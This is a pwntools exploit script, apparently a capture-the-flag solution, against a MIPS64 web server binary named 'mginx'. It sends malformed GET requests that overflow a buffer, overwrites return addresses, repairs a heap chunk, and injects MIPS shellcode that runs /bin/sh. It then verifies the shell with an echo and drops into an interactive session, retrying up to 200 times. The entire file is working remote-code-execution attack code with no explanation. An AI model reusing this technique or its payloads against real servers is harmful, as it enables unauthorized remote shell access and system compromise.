from pwn import *
import sys

context.update(arch='mips',bits=64,endian="big")

def main(host,port=8888):
    global p
    if host:
        p = remote(host,port)
    else:
        # p = process(["qemu-mips64","-g","1234","./mginx"])
        p = process(["qemu-mips64","./mginx"])
        # gdb.attach(p)
        #

    req = """GET /index \r
Connection: no\r
Content-Length: 4095
\r\n\r
"""
    req = req.ljust(0xf0,"A")

    p.send(req)
    # pause()

    # getshell
    sc = "\x03\xa0\x28\x25\x64\xa5\xf3\x40"
    sc +=  "\x3c\x0c\x2f\x2f\x35\x8c\x62\x69\xaf\xac\xff\xf4\x3c\x0d\x6e\x2f\x35\xad\x73\x68\xaf\xad\xff\xf8\xaf\xa0\xff\xfc\x67\xa4\xff\xf4\x28\x06\xff\xff\x24\x02\x13\xc1\x01\x01\x01\x0c"


    payload = "A"*0xf30
    payload += p64(0x000000012001a250)+p64(0x000000120012400)
    # remain 0x179 byte

    payload += p64(0x1200018c4)+"D"*(0x179-8)
    p.send(payload)
    p.recvuntil("404 Not Found :(",timeout=1)




    req = """GET /index \r
Connection: no\r
Content-Length: 4095
\r\n\r
"""
    req = req.ljust(0xf0,"\x00")
    p.send(req)

    payload = "\x00"*0x288
    # argv_ 0x0000000120012800
    argv_ = p64(0x120012820)+p64(0x120012828)+p64(0x120012830)+p64(0)
    argv_ += "sh".ljust(8,'\x00')
    argv_ += "-c".ljust(8,'\x00')
    argv_ += "/bin/sh".ljust(8,'\x00')
    payload += argv_
    payload += "\x00"*(0x800 - len(argv_))
    # fix the chunk
    payload += p64(0) + p64(21)
    payload += "\x00"*(0xf40-0xa98)
    # remain 0x179 byte

    payload += p64(0x00000001200134c0)

    payload += "\x00"*0x20+sc+"\x00"*(0x179-0x28-len(sc))

    p.send(payload)
    try:
        p.recvuntil("404 Not Found :(",timeout=1)
        p.sendline("echo dididididi")
        _ = p.recvuntil("didid",timeout=1)
        if _ != '':
            p.interactive()
    except:
        p.close()
        return
    p.close()


if __name__ == "__main__":
    for i in range(200):
        try:
            main(args['REMOTE'])
        except:
            continue
    # main(args['REMOTE'])

